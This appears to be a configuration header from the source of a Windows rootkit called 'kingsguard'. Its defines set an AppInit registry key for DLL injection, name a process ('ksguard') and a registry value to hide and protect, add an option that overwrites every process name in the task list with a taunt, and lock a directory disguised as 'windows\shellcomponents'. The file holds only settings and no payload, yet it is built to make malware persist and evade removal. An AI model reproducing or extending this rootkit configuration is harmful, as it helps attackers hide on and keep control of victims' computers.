#define APPINIT L"appinit" // reg key where dll is stored

#define DLL L"kgsgrd" // dll name
#define PROCESSA "ksguard" // Process name to hide / protect
#define PROCESSW L"ksguard" // Process name to hide / protect
#define KEY L"ksguard" // Reg value to hide / protect

#define TAUNT false // if true, overwrite process list with TAUNTVALUE

#if TAUNT
#define TAUNTVALUE L"kingsguard" // overwrite all process names 
#endif

// #define NOTERM false // if true, NtTerminate hook prevents killing other processes. CURRENTLY BROKEN

#define PATHLOCK true // if true, lock path and subdirectories

#if PATHLOCK
#define PATH L"windows\\shellcomponents" // path + subdirectories to lock
#endif

